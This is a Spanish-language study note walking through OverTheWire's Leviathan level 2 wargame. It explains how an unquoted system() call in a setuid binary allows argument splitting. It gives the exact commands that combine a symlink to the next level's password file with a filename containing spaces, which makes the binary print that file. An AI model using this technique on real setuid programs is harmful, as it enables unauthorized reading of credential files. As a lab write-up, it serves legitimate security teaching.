---
title: Leviathan Nivel 2 a 3
date: 2026-06-14
tags: [ciberseguridad, linux, setuid, symlink, leviathan, wargame]
type: nota
status: en-progreso
source: claude-code
aliases: [Leviathan 2, leviathan2, printfile exploit, symlink setuid]
---

# Leviathan Nivel 2 a 3

Nivel oficial: https://overthewire.org/wargames/leviathan/leviathan3.html

Este nivel introduce una vulnerabilidad clasica en binarios setuid: la combinacion de una comprobacion de permisos por nombre de archivo y una invocacion de `system()` sin entrecomillar el argumento. El resultado es que un fichero con espacios en el nombre permite separar lo que el kernel comprueba de lo que `cat` realmente lee.

> Este wargame es un laboratorio legal y autorizado por OverTheWire. Solo practica estas tecnicas en entornos expresamente permitidos.

## Objetivo

Leer `/etc/leviathan_pass/leviathan3` siendo `leviathan2`, usando el binario setuid `~/printfile` que tiene acceso de lectura al archivo de contrasena pero nosotros no.

## Que aprendes

| Concepto / Comando | Para que sirve |
|---|---|
| Binario setuid | Ejecuta con los privilegios del propietario, no del invocador |
| `access(path, R_OK)` | Comprueba permisos usando el UID **real** del invocador (no el efectivo) |
| `system("cat " + arg)` | Invoca shell; si `arg` no va entrecomillado, los espacios parten el argumento |
| `ln -s destino nombre` | Crea enlace simbolico: `nombre` apunta a `destino` |
| `ltrace binario arg` | Intercepta llamadas a funciones de biblioteca para ver que hace el binario |
| `touch 'nombre con espacios'` | Crea fichero cuyo nombre contiene espacios literales |

### Concepto clave

**Inyeccion por argumentos no entrecomillados en `system()`.**

`printfile` ejecuta internamente algo equivalente a:

```c
access(argv[1], R_OK);          // comprueba con UID real
system("/bin/cat " argv[1]);    // concatena sin comillas
```

La discrepancia ocurre en dos pasos:

1. `access("file con espacios", R_OK)` evalua el fichero `file con espacios` como una unidad. Si ese fichero existe y es legible, la comprobacion pasa.
2. La shell que lanza `system()` interpreta `/bin/cat file con espacios` como tres argumentos: `file`, `con` y `espacios`. `cat` intenta leer cada uno por separado.

Si `file` es un symlink a `/etc/leviathan_pass/leviathan3`, el proceso setuid (que corre como `leviathan3`) abre ese destino con exito y vuelca la contrasena.

## Paso a paso

**1. Conectarse al nivel**

```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
# contrasena: <pass_leviathan2>
```

**2. Inspeccionar el binario**

```bash
ls -la ~/printfile
ltrace ~/printfile /etc/leviathan_pass/leviathan2
```

`ltrace` muestra la secuencia `access()` -> `system()` y confirma que el argumento no va entre comillas en la cadena pasada a la shell.

**3. Preparar el escenario en /tmp**

```bash
mkdir -p /tmp/le2
cd /tmp/le2
```

**4. Crear el symlink con nombre corto**

```bash
ln -s /etc/leviathan_pass/leviathan3 file
```

`file` apunta a la contrasena del siguiente nivel. El binario, corriendo como `leviathan3`, podra abrirlo; nosotros no podemos leerlo directamente.

**5. Crear el fichero legible cuyo nombre tiene un espacio**

```bash
touch 'file con espacios'
```

Este fichero esta vacio y es legible por cualquier usuario. Su nombre empieza por `file`, que es exactamente el symlink que acabamos de crear.

**6. Lanzar el exploit**

```bash
~/printfile 'file con espacios'
```

Flujo interno:
- `access("/tmp/le2/file con espacios", R_OK)` -> OK (fichero vacio, legible).
- `system("/bin/cat /tmp/le2/file con espacios")` -> la shell parte en tres argumentos; `cat` lee `/tmp/le2/file` (el symlink) e imprime `/etc/leviathan_pass/leviathan3`.

La contrasena aparece en pantalla.

**7. Verificar el mecanismo con ltrace**

```bash
ltrace ~/printfile 'file con espacios'
```

Permite ver exactamente que cadena recibe `system()` y confirmar la particion por espacios.

## Por que funciona

`access()` usa el **UID real** del proceso (el nuestro, `leviathan2`), mientras que la apertura de archivo que hace `cat` usa el **UID efectivo** (el del propietario del setuid, `leviathan3`). Esta asimetria es la razon por la que `access()` existe como vector de TOCTOU/privilege-check bypass en binarios setuid.

La ausencia de comillas en la construccion de la cadena de `system()` convierte el nombre del archivo en una frontera de argumentos de shell. Los dos efectos combinados dan al atacante control total sobre que archivo lee `cat` con privilegios elevados.

## Errores comunes

| Error | Causa | Solucion |
|---|---|---|
| `printfile` dice "You cant have that file!" | `access()` fallo: el fichero no existe o no es legible | Verifica que `file con espacios` existe en el directorio actual y tiene permisos `644` |
| `cat` no imprime la contrasena, solo lineas vacias | El symlink apunta al lugar equivocado o el nombre del fichero no coincide | Comprueba con `ls -la /tmp/le2/` que `file -> /etc/leviathan_pass/leviathan3` |
| `No such file or directory` en `cat` | El directorio de trabajo no es `/tmp/le2/` al invocar `printfile` | Usa la ruta absoluta: `~/printfile '/tmp/le2/file con espacios'` |
| Nombre del fichero pierde las comillas | La shell interpreta el espacio antes de pasarlo al programa | Usa siempre comillas simples alrededor del argumento con espacios |

## Pasar al siguiente nivel

Con la contrasena obtenida, conectate como `leviathan3`:

```bash
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
# contrasena: <pass_leviathan3>
```

## Conexiones

- [[Leviathan/00_README]]
- [[MOC_Ciberseguridad]]
- [[06-seguridad-de-sistemas-y-hardening]]
- [[13-herramientas-en-detalle]]
